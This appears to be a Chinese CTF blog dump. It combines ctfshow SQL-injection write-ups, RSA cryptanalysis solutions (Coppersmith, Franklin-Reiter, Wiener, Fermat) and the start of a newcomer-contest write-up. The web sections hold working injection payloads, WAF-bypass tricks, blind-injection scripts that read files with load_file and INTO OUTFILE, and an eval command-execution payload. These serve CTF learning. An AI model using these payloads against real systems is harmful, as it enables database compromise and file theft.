ctfshow_user5 where username !='flag' and id = '\".$_GET['id'].\"' limit 1;\"; 返回逻辑 12345//检查结果是否有flag if(!preg_match('/[\\x00-\\x7f]/i', json_encode($ret))){ $ret['msg']='查询成功'; } 已经不能返回任何东西了, \\x00~\\x7f全部过滤掉了, 考虑文件的方式读取flag. 用INTO OUTFILE 可以将查询结果输出到某文件中, 在这里只需要输出到一个文件里就行了, 不过路径要记得写对var\\www\\html\\ payload: 1' union select username,password from ctfshow_user5 where username='flag' into outfile '/var/www/html/res.txt'--+ 结果就在res.txt里 web 176开始有过滤了 语句:$sql = \"select id,username,password from ctfshow_user where username !='flag' and id = '\".$_GET['id'].\"' limit 1;\"; 返回逻辑 1234//对传入的参数进行了过滤 function waf($str){ //代码过于简单，不宜展示 } 只知道有过滤, 但不知道过滤了啥, 也没多想先试试1' or 1 --+就出flag了, 看群主的视频这题应该是大小写绕过 web 177语句$sql = \"select id,username,password from ctfshow_user where username !='flag' and id = '\".$_GET['id'].\"' limit 1;\"; 返回逻辑 1234//对传入的参数进行了过滤 function waf($str){ //代码过于简单，不宜展示 } 一样是过滤, 继续尝试1' or 1 --+, 发现无结果, 应该是某些字符被过滤了. 这个时候因为不知道什么被过滤, 所以输入越少东西越能判断出过滤了什么. 先尝试1'--+ 发现无结果, 可能--+被过滤了, 尝试用# 也不行, 再试试%23, 发现可以绕过过滤 再尝试1' %23又是无结果,明显是空格被过滤了, 利用/**/注释绕过空格. 于是得到一个payload: 1'/**/or/**/1%23 web 178 179依旧是过滤掉了空格, 但是/**/不能使用了, 则尝试用括号来绕过 payload:1'or(1)%23 简单粗暴 看了群主的视频发现还可以用%09来代替空格, 这个是制表符, 在sql中跟空格一样的作用 payload:1'%09or%091%23 然后在web 179里, %09也被过滤了, 第一个payload还是可以用的, 但还可以试试别的, 比如%0a %0b %0c等等, 把ascii码前面那几个字符都试一试, 试出%0c也是可以的 payload:1'%0cor%0c1%23 web 180语句$sql = \"select id,username,password from ctfshow_user where username !='flag' and id = '\".$_GET['id'].\"' limit 1;\"; 跟前面的不同的是, 这次连%23都被过滤了, 可以说没办法注释掉后面的sql语句了, 只能通过闭合的方式使得语句不会出错 例如1'and'a'='a, 这样语句就会变成 1select id,username,password from ctfshow_user where username !='flag' and id = '1'and'a'='a' limit 1 可以看到引号被成功的闭合, 结果也是有的. 但是, 想要查出flag还需要想办法使得username != 'flag'无效, 因username != 'flag'与后面的条件关系是and, 所以并不能通过他原本的语句中的id=查id = 26找到flag(id=26是flag是因为前面的题目都是26), 所以需要构造一个新的与前面的条件的关系为or的条件来查找 所以考虑了1'or(1)and'a, 但是得到的结果却只有一行, 原因是因为语句中有个limit 1. 而原本语句中的id=1是可以查询出结果的, 这里不能让他查询出结果了, 而出来的结果又必须是flag那一条, 所以考虑将or括号中的条件改成id=26. 这样就成功构造出payload:0'or(id=26)and'a'='a web 181语句$sql = \"select id,username,password from ctfshow_user where username !='flag' and id = '\".$_GET['id'].\"' limit 1;\"; 返回逻辑 1234//对传入的参数进行了过滤 function waf($str){ return preg_match('/ |\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x00|\\x0d|\\xa0|\\x23|\\#|file|into|select/i', $str); } web 180的payload中的字符串这题都没有过滤掉, 直接0'or(id=26)and'a'='a出结果 web 182和web 181一样, 直接0'or(id=26)and'a'='a web 183查询语句 123//拼接sql语句查找指定ID用户 $sql = \"select count(pass) from \".$_POST['tableName'].\";\"; 返回逻辑 1234//对传入的参数进行了过滤 function waf($str){ return preg_match('/ |\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x0d|\\xa0|\\x00|\\#|\\x23|file|\\=|or|\\x7c|select|and|flag|into/i', $str); } 查询结果 12//返回用户表的记录总数 $user_count = 1; 结果只会返回结果的数量, 而且过滤掉了很多关键字. 看了下视频, 这里要用到正则+盲注, sql中的正则是用REGEXP’str’来匹配的, 例如select id from table where username REGXEP'admin' 就会查询符合正则式子的username字段的那一行 这里因为可以知道结果有几行, 也就意味着可以判断正则是否匹配, 由前面的题目可以知道flag的格式是ctfshow{xxxx-xxx-x-x-x}这种, 而且只有小写字母和数字, 所以考虑用脚本盲注, 从`ctfshow_user`where`pass`REGEXP'ctfshow{开始猜flag 1234567891011121314151617181920import requestsimport reurl = 'http://aba2e256-aa5c-4cf3-849f-b4f6d61fb78d.chall.ctf.show:8080/select-waf.php'Str = '0123456789abcdefghijklmnopqrstuvwxyz-}'data = { 'tableName': \"`ctfshow_user`where`pass`REGEXP'ctfshow{\"}while True: for i in Str: Data = { 'tableName': data['tableName'] + i + \"'\" } resp = requests.post(url=url, data=Data) if re.findall('\\$user_count = (\\d)',resp.content.decode())[0] == '1': data['tableName'] += i print(re.findall('\\$user_count = (\\d)',resp.content.decode())[0]) if i == '}': exit() break 跑完就得到flag了 web 184查询语句 12//拼接sql语句查找指定ID用户 $sql = \"select count(*) from \".$_POST['tableName'].\";\"; 返回逻辑 1234//对传入的参数进行了过滤 function waf($str){ return preg_match('/\\*|\\x09|\\x0a|\\x0b|\\x0c|\\0x0d|\\xa0|\\x00|\\#|\\x23|file|\\=|or|\\x7c|select|and|flag|into|where|\\x26|\\'|\\\"|union|\\`|sleep|benchmark/i', $str); } 查询结果 12//返回用户表的记录总数 $user_count = 0; 这题连where都过滤掉了, 还剩下一个可以用来设定条件的on, 如果要用on的, 需要用到多表联合查询JOIN, 在两个表(依旧是同一个表)中查询, 生成的临时表中就可以用on 不管是INNER JOIN还是LEFT JOIN或者是RIGHT JOIN都无所谓, 只需要猜flag正确的时候回显不同即可, 因为这题没有过滤掉空格, 构造payload:tableName=ctfshow_user as a inner join ctfshow_user as b on substr(b.pass,num,1)regexp(char(str)), 其中num就是flag的位数, str就是猜测的字符 , 因为知道flag前缀是ctfshow{, 所以从第9位开始猜就行了 12345678910111213141516171819202122import requestsimport reurl = 'http://87deffe2-4291-41ac-b76b-1bcaf046e697.chall.ctf.show:8080/select-waf.php'Str = '0123456789abcdefghijklmnopqrstuvwxyz-}'data = { 'tableName': \"ctfshow_user as a right join ctfshow_user as b on substr(b.pass,{},1)regexp(char({}))\"}num = 9flag = 'ctfshow{'while True: for i in Str: Data = { 'tableName': data['tableName'].format(num, ord(i)) } resp = requests.post(url=url, data=Data) if re.findall('\\$user_count = (\\d*)', resp.content.decode())[0] == '43': flag += i print(flag) if i == '}': exit() num += 1 web 185 186在184的基础上过滤掉了数字, 也就是说payload里面不能出现数字, 可以用true+true+true….来构造想要的数字, 如99就是99个true相加, 利用这个继续写脚本得到flag 从Y4博客找到一张图 1234567891011121314151617181920212223import requestsimport reurl = 'http://2f2306e9-b139-4243-b9be-ff87dacd631c.chall.ctf.show:8080/select-waf.php'Str = '0123456789abcdefghijklmnopqrstuvwxyz-}'data = { 'tableName': \"ctfshow_user as a right join ctfshow_user as b on substr(b.pass,{},true)regexp(char({}))\"}num = 9flag = 'ctfshow{'while True: for i in Str: Data = { 'tableName': data['tableName'].format((num*'true+')[:-1], (ord(i)*'true+')[:-1]) } resp = requests.post(url=url, data=Data) if re.findall('\\$user_count = (\\d*)', resp.content.decode())[0] == '43': flag += i print(flag) if i == '}': exit() num += 1 web 187以前做过的md5($password,true) 可以去看看 jarvis oj - login, 一个很神奇的字符串ffifdyop 1$sql = \"select count(*) from ctfshow_user where username = $_POST['username'] and password= md5($_POST['password'],true)\"; md5('ffifdyop',true) = \"'or'6xxxxxxx\" web 188先pass , 有点奇怪 web 189查询语句 12//拼接sql语句查找指定ID用户$sql = \"select pass from ctfshow_user where username = {$username}\"; 返回逻辑 12345678910111213141516//用户名检测if(preg_match('/select|and| |\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x0d|\\xa0|\\x00|\\x26|\\x7c|or|into|from|where|join|sleep|benchmark/i', $username)){ $ret['msg']='用户名非法'; die(json_encode($ret));}//密码检测if(!is_numeric($password)){ $ret['msg']='密码只能为数字'; die(json_encode($ret));}//密码判断if($row['pass']==$password){ $ret['msg']='登陆成功'; } hint: flag在api/index.php文件中 学习到了一些sql注入可能用到的函数: if(exp1,exp2,exp3), 当exp1为TRUE时函数返回exp2, 反之返回exp3, 可搭配一些字符串比较函数来进行盲注 load_file(file_name), 读取一个文件并将其内容作为字符串返回, 用于读取外部文件 locate(substr,str), 返回字符串str第一次出现子串substr的位置 strcmp(str1,str2),如果这两个字符串相等返回0，如果第一个参数是根据当前的排序顺序比第二较小则返回-1，否则返回1 hint已经告诉了我们flag在文件index.php中, 要在sql中读取文件, 可以使用load_file(), 所以要在username ={$username}处执行load_file()且判断出flag是啥. 注意到$username没有被引号包着, 所以如果$username是语句是可以执行的. 这里要用if()和一些字符串你处理的函数来对flag进行盲注. 当username=1&amp;password=0时返回的是查询失败而当username=0&amp;password=0时返回的是密码错误, 可以根据这个回显来对flag进行判断. 首先, 先找到flag在文件中的位置, 因为前缀是ctfshow{ ,所以根据这个来找到flag的位置. 12345678910111213def findindex(): Index = 1 url = 'http://67064451-541b-444f-8c0e-c71be0d43b7f.chall.ctf.show:8080/api/' while True: data = { 'username': \"if(locate('ctfshow{',\" + \"load_file('/var/www/html/api/index.php'))&gt;{},0,1)\".format(Index), 'password': '0' } resp = requests.post(url=url, data=data) if \"\\\\u5bc6\\\\u7801\\\\u9519\\\\u8bef\" in resp.content.decode(): Index += 1 else: return Index + 8 然后根据上面得到的flag的起始位置开始猜flag, 最终脚本为 123456789101112131415161718192021222324252627282930313233343536import requestsurl = 'http://67064451-541b-444f-8c0e-c71be0d43b7f.chall.ctf.show:8080/api/'Str = '0123456789abcdefghijklmnopqrstuvwxyz-}'flag = 'ctfshow{'def findindex(): Index = 1 while True: data = { 'username': \"if(locate('ctfshow{',\" + \"load_file('/var/www/html/api/index.php'))&gt;{},0,1)\".format(Index), 'password': '0' } resp = requests.post(url=url, data=data) if \"\\\\u5bc6\\\\u7801\\\\u9519\\\\u8bef\" in resp.content.decode(): Index += 1 else: return Index + 8Index = findindex()while True: for i in Str: data = { 'username': \"if(strcmp('{}',substr(load_file('/var/www/html/api/index.php'),{},1))=0,0,1)\".format(i, Index), 'password': '0' } resp = requests.post(url=url, data=data) if \"\\\\u5bc6\\\\u7801\\\\u9519\\\\u8bef\" in resp.content.decode(): flag += i Index += 1 print(flag) if i == '}': exit()","tags":[{"name":"Summary","slug":"Summary","permalink":"http://tearsjin.github.io/tags/Summary/"},{"name":"Web","slug":"Web","permalink":"http://tearsjin.github.io/tags/Web/"},{"name":"ctfshow","slug":"ctfshow","permalink":"http://tearsjin.github.io/tags/ctfshow/"}]},{"title":"HITCTF2020 ezRSA - The learing or Coppersmith attack","date":"2020-12-10T03:49:56.000Z","path":"2020/12/10/HITCTF2020-ezRSA-The-learing-or-Coppers/","text":"关于出去玩只能在手机上用Sage Cell Server做题那件事也是好久没写博客了, 刚好学习一下coppersmith attack 先把题目放上来吧 123456789101112131415161718192021222324252627282930313233#! /bin/bash python2from flag import flagfrom Crypto.Util.number import *import osflag = flag+os.urandom(32)p = getPrime(512)q = getPrime(512)n = p*qe = 3phi = (p-1)*(q-1)d = inverse(e,phi)m1 = bytes_to_long(flag)m2 = bytes_to_long(flag+os.urandom(8))assert pow(m1,3) &gt; nc1 = pow(m1,e,n)c2 = pow(m2,e,n)print \"c1 = %d\"%c1print \"c2 = %d\"%c2print \"n = %d\"%n'''c1 = 80653989110793139102855968265870741534421660712327094406252902072101613222389965470648960909763762225046314865847982289607336162281576790259047039000290839621007818742162307587677505606906923990312494483089046762906753345262127057162580025978324312642501118741099945205580088180943278903718853065363662232083c2 = 5400424653941721880728309040044485787870754570249463205700803061685717472238274158687499478247752712211743180931379853481727502849946080245130393042405383007613277703993980940893569303012323853427216643473698166348237252515222556282004058588218846910754415888401275689026778751805826968590155607937830708498n = 92782661709340169703868140576276816382956055756557631391697803785121887338308072309948803413610339884338861040226250478895118923994109662815448681629315227440953320952623296140315432654804940766553284237954507627610922864055435652884184926768295740697589798180602153344302964255974935777945481843144629875127''' 做这个之前, 先来看看coppersmith attack(直接翻CTF wiki 对于单变量的方程(多变量的还没接触过, 能否使用coppersmith attack 就看变量是否满足上面这部分所提到的约束. 来分析一下这些约束, 对于一般的RSA列出模N意义下的多项式方程求解根的时候, 因为N往往是两个大素数的乘积, 那么N必定会有一个因子 是满足 的, 所以一般 是取0.4~0.6的 但是有需要注意的是, 有时候求解根并不是在模N的意义下进行的, 这个时候就需要慎重的考虑一下的取值了 而对于 , 也就是多项式的阶数, 阶数越小对根的约束就越宽松, 这也就是为什么CTF wiki上会有这么一句 所以, 判断是否可以使用coppersmith attack, 就看需要解的根是否足够小(一般通过题目所给的信息来判断根的位数, 再通过e 和 N 的位数,来判断是否可以使用coppersmith attack 需要注意的是!由于LLL是启发式算法, 所以有的时候解出来的根会不满足约束, 也就是说当需要解的根近乎足够小就可以试试coppersmith了 现在回到题目, 先来分析一下题目 这题先对flag进行了一次填充flag = flag+os.urandom(32), 如果flag太小是可能直接解出来的. 然后就是对明文进行加密,再进行一次填充再加密, 写成式子就是 其实可以令M=2^64^m 和 , 就可以有两个方程, 两个未知数, 肯定是可以解出根来的, 只不过是难不难解出来的问题了. 注意到这里的 是64位的, 而是1024位的, e=3也很小, 可以考虑试试coppersmith先解出. 事实上解用到的就是Coppersmith’s short-pad attack Coppersmith’s short-pad attack wiki上说的也很清楚了, 在对明文进行填充的时候, 如果填充的位数很少,就可以算出,只需要, 就可以解出了. 在这里显然是满足的. 我们先把两个方程化成只有一个未知数的方程(代码里diff = xn ,然后用small_root()求解 12345678910111213141516171819202122232425C1 = 80653989110793139102855968265870741534421660712327094406252902072101613222389965470648960909763762225046314865847982289607336162281576790259047039000290839621007818742162307587677505606906923990312494483089046762906753345262127057162580025978324312642501118741099945205580088180943278903718853065363662232083C2 = 5400424653941721880728309040044485787870754570249463205700803061685717472238274158687499478247752712211743180931379853481727502849946080245130393042405383007613277703993980940893569303012323853427216643473698166348237252515222556282004058588218846910754415888401275689026778751805826968590155607937830708498n = 92782661709340169703868140576276816382956055756557631391697803785121887338308072309948803413610339884338861040226250478895118923994109662815448681629315227440953320952623296140315432654804940766553284237954507627610922864055435652884184926768295740697589798180602153344302964255974935777945481843144629875127C1=(C1*2**192)%ne = 3n1 = nPRxy.&lt;x,y&gt; = PolynomialRing(Zmod(n1))PRx.&lt;xn&gt; = PolynomialRing(Zmod(n1))PRZZ.&lt;xz,yz&gt; = PolynomialRing(Zmod(n1)) g1 = x**e - C1g2 = (x + y)**e - C2 q1 = g1.change_ring(PRZZ)q2 = g2.change_ring(PRZZ)h = q2.resultant(q1)h = h.univariate_polynomial()h = h.change_ring(PRx).subs(y=xn)h = h.monic()roots = h.small_roots(X=2**64, beta=0.4)diff = roots[0]# diff = 15325913216714639606 这里的small_root()的参数很重要, X是设置根的上界的, 这个要尽可能的接近根的大小, 这样求解出来的可能性才高. 而beta一般0.4~0.6就行了. 接下来就是算M了, 这个又是另外一个method - Franklin-Reiter related-message attack Franklin-Reiter related-message attack先来看看wiki上怎么说通俗一点就是, 当两个明文满足线性关系的时候,是两个方程的一个公因式, 因此可以利用在多项式的欧几里得算法算出这个公因式, 也就是我们要算的M 1234567891011x = PRx.gen() g1 = x**e - C1g2 = (x + diff)**e - C2# 辗转相除法求公因式while g2: g1, g2 = g2, g1 % g2g = g1.monic()# g = xn + 92782661709340169703868140576276816382956055756557631391697803785121887338308072309948803413610339884338855507056808173780823100612346393533355160251650215111996263513671265306614427524745781162849613136748611330041590288489365015322686961617690785110909682202890569108842866175345662756188830323253136519607M = -g[0] M算出来了别忘了除一个2^64(一开始为了方便计算所以把m放大了, 还好不影响解题, 以后做的时候要小心为了方便计算导致算不出根来, 所以最后的代码是123456789101112131415161718192021222324252627282930313233343536373839404142C1 = 80653989110793139102855968265870741534421660712327094406252902072101613222389965470648960909763762225046314865847982289607336162281576790259047039000290839621007818742162307587677505606906923990312494483089046762906753345262127057162580025978324312642501118741099945205580088180943278903718853065363662232083C2 = 5400424653941721880728309040044485787870754570249463205700803061685717472238274158687499478247752712211743180931379853481727502849946080245130393042405383007613277703993980940893569303012323853427216643473698166348237252515222556282004058588218846910754415888401275689026778751805826968590155607937830708498n = 92782661709340169703868140576276816382956055756557631391697803785121887338308072309948803413610339884338861040226250478895118923994109662815448681629315227440953320952623296140315432654804940766553284237954507627610922864055435652884184926768295740697589798180602153344302964255974935777945481843144629875127C1=(C1*2**192)%ne = 3n1 = nPRxy.&lt;x,y&gt; = PolynomialRing(Zmod(n1))PRx.&lt;xn&gt; = PolynomialRing(Zmod(n1))PRZZ.&lt;xz,yz&gt; = PolynomialRing(Zmod(n1)) g1 = x**e - C1g2 = (x + y)**e - C2 q1 = g1.change_ring(PRZZ)q2 = g2.change_ring(PRZZ)h = q2.resultant(q1)h = h.univariate_polynomial()h = h.change_ring(PRx).subs(y=xn)h = h.monic()roots = h.small_roots(X=2**64, beta=0.4)diff = roots[0]x = PRx.gen() g1 = x**e - C1g2 = (x + diff)**e - C2 while g2: g1, g2 = g2, g1 % g2g = g1.monic()M = -g[0]h =hex(M*inverse_mod(2**64,n))[2:]s=\"\"for i in range(0,len(h),2): s+=chr(int(h[i:i+2],16))print(s)# s = HITCTF2020{dde65d8adf22b5e1a0c0c10eff23c24c} 一下子学了两个方法好爽啊, 在看到e很小的时候, 一定要想起coppersmith来.不过这些应该都算是基础的, 特别是coppersmith的使用感觉还有很多很深奥的地方,","tags":[{"name":"Crypto","slug":"Crypto","permalink":"http://tearsjin.github.io/tags/Crypto/"},{"name":"RSA","slug":"RSA","permalink":"http://tearsjin.github.io/tags/RSA/"},{"name":"Summary","slug":"Summary","permalink":"http://tearsjin.github.io/tags/Summary/"},{"name":"Coppersmith attack","slug":"Coppersmith-attack","permalink":"http://tearsjin.github.io/tags/Coppersmith-attack/"}]},{"title":"writeup for 2020 祥云杯 Crypto","date":"2020-11-23T13:29:58.000Z","path":"2020/11/23/writeup-for-2020-祥云杯/","text":"只会做密码的菜鸡 Crypto0x01 SimpleRSA题目1234567891011121314151617181920from Crypto.Util.number import *import gmpy2p, q, r = [getPrime(512) for i in range(3)]n = p * q * rphi = (p - 1) * (q - 1) * (r - 1)d = getPrime(256)e = gmpy2.invert(d , phi)flag = b\"flag{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}\"c = pow(bytes_to_long(flag), e, n)print(e, n)print(c)'''1072295425944136507039938677101442481213519408125148233880442849206353379681989305000570387093152236263203395726974692959819315410781180094216209100069530791407495510882640781920564732214327898099944792714253622047873152630438060151644601786843683746256407925709702163565141004356238879406385566586704226148537863811717298966607314747737551724379516675376634771455883976069007134218982435170160647848549412289128982070647832774446345062489374092673169618836701679 18272219926928491792440698342738165657142765053052461034359628874615203817097399272230552399539651824512521947689357026280565870341738006058274240432816731836064787361899273777455753799088764564850168324168060292549727696173935602384943260789408422951530292853944917837123849901251007745964770644822808294078560148352317117889900666765344144147410677595641023316146667137970738112450995121305286004640994927346716890849900360778600422384549089608415951071229331731079929174110820494059355415059104229905268763089157771374657932646711017488701536460687319648362549563313125268069722412148023885626962640915852317297916421725818077814237292807218952574111141918158391190621362508862842932945783059181952614317289116405878741758913351697905289993651105968169193211242144991434715552952340791545323270065763529865010326192824334684413212357708275259096202509042838081150055727650443887438253964607414944245877904002580997866300452''' 思路说实话这题能做出来也是运气好…wiener还没有自己复现过, 一直都是用现成的脚本. 而这次的n是多个素因子的, 之前的脚本不能用了. 本来是想着去学一下怎么复现的, 结果直接找到原题了(祥云杯好像挺多都能找到原题或者是很像的题的 这是找到的原题的wp 直接抄脚本就能算出d了, 所以到底该怎么写wiener呢? 咕咕咕…有空一定学会它! 代码12345678910111213141516171819202122232425262728293031323334def hex2text(Hex): if len(Hex) % 2: Hex = '0' + Hex return ''.join([chr(int(b, 16)) for b in [Hex[i:i + 2] for i in range(0, len(Hex), 2)]])def dec2text(Dec): Hex = hex(Dec)[2:] return hex2text(Hex)def wiener(e, n): m = 12345 c = pow(m, e, n) q0 = 1 list1 = continued_fraction(Integer(e) / Integer(n)) conv = list1.convergents() for i in conv: k = i.numerator() q1 = i.denominator() for r in range(20): for s in range(20): d = r * q1 + s * q0 m1 = pow(c, d, n) if m1 == m: return d q0 = q1c = 1079929174110820494059355415059104229905268763089157771374657932646711017488701536460687319648362549563313125268069722412148023885626962640915852317297916421725818077814237292807218952574111141918158391190621362508862842932945783059181952614317289116405878741758913351697905289993651105968169193211242144991434715552952340791545323270065763529865010326192824334684413212357708275259096202509042838081150055727650443887438253964607414944245877904002580997866300452e = 1072295425944136507039938677101442481213519408125148233880442849206353379681989305000570387093152236263203395726974692959819315410781180094216209100069530791407495510882640781920564732214327898099944792714253622047873152630438060151644601786843683746256407925709702163565141004356238879406385566586704226148537863811717298966607314747737551724379516675376634771455883976069007134218982435170160647848549412289128982070647832774446345062489374092673169618836701679n = 1827221992692849179244069834273816565714276505305246103435962887461520381709739927223055239953965182451252194768935702628056587034173800605827424043281673183606478736189927377745575379908876456485016832416806029254972769617393560238494326078940842295153029285394491783712384990125100774596477064482280829407856014835231711788990066676534414414741067759564102331614666713797073811245099512130528600464099492734671689084990036077860042238454908960841595107122933173d = wiener(e,n)print(dec2text(pow(c,d,n))) 0x02 RSAssss题目1234567891011121314151617from Crypto.Util.number import *from gmpy2 import next_primep = getPrime(512)q = getPrime(512)n = p * q * next_prime(p) * next_prime(q)e = 0x10001flag = b\"flag{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}\"cipher = pow(bytes_to_long(flag), e, n)print(n, cipher)'''8030860507195481656424331455231443135773524476536419534745106637165762909478292141556846892146553555609301914884176422322286739546193682236355823149096731058044933046552926707682168435727800175783373045726692093694148718521610590523718813096895883533245331244650675812406540694948121258394822022998773233400623162137949381772195351339548977422564546054188918542382088471666795842185019002025083543162991739309935972705871943787733784491735500905013651061284020447578230135075211268405413254368439549259917312445348808412659422810647972872286215701325216318641985498202349281374905892279894612835009186944143298761257 3304124639719334349997663632110579306673932777705840648575774671427424134287680988314129312593361087606243819528298610131797078262351307396831985397555390640151391138633431951746748156610463582479645561779194981806129898009876517899450840875569675976765155608446799203699927448835004756707151281044859676695533373755798273892503194753948997947653100690841880925445059175494314198605475023939567750409907217654291430615102258523998394231436796902635077995829477347316754739938980814293304289318417443493019704073164585505217658570214989150175123757038125380996050761572021986573934155470641091678664451080065719261207''' 思路费马分解! 我怎么会没想到呢, 两个接近的因子就可以用fermat了.这题也是运气好,在这个大数分解网站后台跑了两个钟分出两半来了(真的是没注意放后台跑的 分出的两半:12x1 = 89615068527538836315602124154008300286636934599617334867509053076622715365809371740037316558871796433906844464070995869293654082577887578197182408045175035339285085728002838220314068474670975228778464240088084331807420720121364486765011169669747553393661650912114228227308579940164269877101973728452252879383x2 = 89615068527538836315602124154008300286636934599617334867509053076622715365809371740037316558871796433906844464070995869293654082577887578197182408045172781798703173650574737644914515591522256758848089955578713458715234536664415216526830967831862301518636586702212189087959136509334102772855657664091570630079 考虑到np = next_prime(p)所以p和np不会相差太远, 可以有 不妨假设 又因为p,q是随机生成的两个大素数, 他们相等的可能性太低. 而分出的x1, x2(x1&gt;x2)非常接近, 则x1,x2可能有的组合有或者是(可能还有没考虑到的?… 首先尝试第一种组合(直接中了x1和x2相减有消元 则可以有关于q的二次方程 因为解是整数, 所以delta应该为完全平方数 所以利用这个特点可以爆破出a,b 从而解出q,再而就能有p,q+b , p+a了 (有一点不明白就是按理来说a,b只有1组?可能是我没考虑周到,跑出来4组a,b, 发现只有第四组跑出来的q是真正的q(其他三组都是kq), 所以直接采用第四组的q和a,b 想明白了! 因为二次项的系数是a, 如果a的因数里面有完全平方数, 那么就可能解出kq这个解了! 求出n的四个素因子之后常规的RSA解密就行了 代码12345678910111213141516171819202122232425262728293031323334353637383940# coding=utf-8from gmpy2 import iroot, gcd, invertfrom Crypto.Util.number import long_to_bytesn = 8030860507195481656424331455231443135773524476536419534745106637165762909478292141556846892146553555609301914884176422322286739546193682236355823149096731058044933046552926707682168435727800175783373045726692093694148718521610590523718813096895883533245331244650675812406540694948121258394822022998773233400623162137949381772195351339548977422564546054188918542382088471666795842185019002025083543162991739309935972705871943787733784491735500905013651061284020447578230135075211268405413254368439549259917312445348808412659422810647972872286215701325216318641985498202349281374905892279894612835009186944143298761257x1 = 89615068527538836315602124154008300286636934599617334867509053076622715365809371740037316558871796433906844464070995869293654082577887578197182408045175035339285085728002838220314068474670975228778464240088084331807420720121364486765011169669747553393661650912114228227308579940164269877101973728452252879383x2 = 89615068527538836315602124154008300286636934599617334867509053076622715365809371740037316558871796433906844464070995869293654082577887578197182408045172781798703173650574737644914515591522256758848089955578713458715234536664415216526830967831862301518636586702212189087959136509334102772855657664091570630079x = x1 - x2for a in range(1, 2000): for b in range(1, 2000): delta_sq = (x + a * b) ** 2 + 4 * a * b * x2 delta = iroot(delta_sq, 2) if delta[1]: p1 = (-(a * b + x) + delta[0]) // (2 * a) p2 = (-(a * b + x) - delta[0]) // (2 * a) if p1 &gt; 0 and gcd(p1, n) != 1: print(p1, a, b) if p2 &gt; 0 and gcd(p2, n) != 1: print(p2, a, b)''' result: 59509622824623675050066481062107171504849863374230362259884081452647743246974989796952759980519162117328441285479164180294347299033843912200899999033032168 1 1536 29754811412311837525033240531053585752424931687115181129942040726323871623487494898476379990259581058664220642739582090147173649516921956100449999516516084 2 768 14877405706155918762516620265526792876212465843557590564971020363161935811743747449238189995129790529332110321369791045073586824758460978050224999758258042 4 384 7438702853077959381258310132763396438106232921778795282485510181580967905871873724619094997564895264666055160684895522536793412379230489025112499879129021 8 192'''q = 7438702853077959381258310132763396438106232921778795282485510181580967905871873724619094997564895264666055160684895522536793412379230489025112499879129021np = x2 // qnq = q + 192p = np - 8e = 0x10001c = 3304124639719334349997663632110579306673932777705840648575774671427424134287680988314129312593361087606243819528298610131797078262351307396831985397555390640151391138633431951746748156610463582479645561779194981806129898009876517899450840875569675976765155608446799203699927448835004756707151281044859676695533373755798273892503194753948997947653100690841880925445059175494314198605475023939567750409907217654291430615102258523998394231436796902635077995829477347316754739938980814293304289318417443493019704073164585505217658570214989150175123757038125380996050761572021986573934155470641091678664451080065719261207phi = (p - 1) * (q - 1) * (np - 1) * (nq - 1)d = invert(e, phi)print(long_to_bytes(pow(c, d, n))) 这道题算的时候还算轻松的, 猜出组合之后用delta爆破也不是第一次做了 总结还是太菜…能做的就只有简单的…剩下的密码题还有 more_calc Exposure easy matrix Blowfish more_calc 看过了Nu1l的WP, S确实是可以用别的办法算的…这几天一定要把原理搞懂(这个应该不难 Exposure和easy matrix都是需要用到LLL的知识的…这个真的还没学会 吃了大亏, 格理论真的要好好的去查一查资料了特别是Exposure…论文都查到了!就是因为不会LLL就不会做了(好菜啊 一定要学会LLL! Blowfish 第一次接触Blowfish, 先暂时放着吧.. 真の总结很多理论知识还没有学会吧. 真的感觉题目是水的, 自己菜做不出来而已.然后就是关于RSA, 做了这次明白了其实很多时候用到的方法都是已经学过的, 观察题目给的条件的特点, 再想想自己会的方法的特点(费马分两个接近pq, wiener适合特别大的e等等. 这样做的可能会更有思路更快一点","tags":[{"name":"Crypto","slug":"Crypto","permalink":"http://tearsjin.github.io/tags/Crypto/"},{"name":"RSA","slug":"RSA","permalink":"http://tearsjin.github.io/tags/RSA/"},{"name":"Lattice","slug":"Lattice","permalink":"http://tearsjin.github.io/tags/Lattice/"},{"name":"WriteUp","slug":"WriteUp","permalink":"http://tearsjin.github.io/tags/WriteUp/"}]},{"title":"writeup for 2020 新生杯","date":"2020-11-12T01:05:28.000Z","path":"2020/11/12/writeup-for-2020-新生杯/","text":"这次顶着桐老爷的id(kirito zbds, 本来只是想着做做Web和尝试做完Crypto的(结果没有做完,有趣的加密是真的有趣, 结果发现不做Misc分不太够, 就肝了几道, 还是学到了不少东西的. 所以先来个目录吧(pwn真的是一道都不会嗯…: Web 假的签到 世界上最简单的后门 Let’s play a simple game again lottery_revenge unserialize 又一个后门 babysql babyssrf OSINT checkin REVERSE 捉迷藏 basic_hash ByteCode Misc 真·签到 Look_at_your_keyboard Buddha Do you know Xp0int close_base PMGBA 集齐五龙珠 Cyrpto 碰碰车 EasyRSA Go Home block cipher ant forest Web假的签到robots! robots! robots! robots协议这个协议里面是用来设定一些网站里不能被搜索引擎获取的内容的(不过CTF里就变成提示做题人方向的一个文件了?一般拿到web说不定robots.txt里面就有提示呢不过大概率是没有的 所以马上进/robots.txt看看, 里面有个提示:/phpp_tql.php访问/phpp_tql.php有一段源码看了下是关于md5的比较的,因为是===, 肯定不会是弱类型了, 想起之前就挖过一个坑某篇MD5的总结, 所以很快就想到用数组来做了. 当a和b都是数组的时候, md5(a) === md5(b) 会判断为真.利用这个就可以构造payload: ?phpp[]=1&amp;hphh[]=2 世界上最简单的后门啊这, eval()真的很安全的.关于直接把用户的输入直接放在eval()中导致目录都被翻了个遍这档事(也没想太多, 手动翻了一下目录(dalao都是直接搜索flag的往上翻一个目录system('ls /');就发现有flag了于是掏出hackbar(POST) c=system('cat /flag'); Let’s play a simple game again开头根据要求GET和POST传参就行了.但是这里好像出了一个小问题. 做题的时候都是想着怎么做快就怎么做. 于是给主办方提交wp的时候似乎遗漏了什么(不要打我我真的是后来才发现的… 不是admin就进不去吗! 其实第一想法应该就是X-Forwarded-For改127.0.0.1的, 然而我直接去看Cookies了, 也没有改XFF(X-Forwarded-For 发现Cookies: YWRtaW49MA==, 两个等号十有八九是base64了, 扔去base64解码出来的是admin=0, 想着让Cookies为admin=1应该没问题了. 所以将Cookies改成YWRtaW49MQ==, 就拿到Welcome admin! Here is your flag:ctf{Have_4_n1ce_c0mpetition!}了. 然而…事情并没有这么简单, 昨天某御坂大佬发了自己的wp之后我发现, 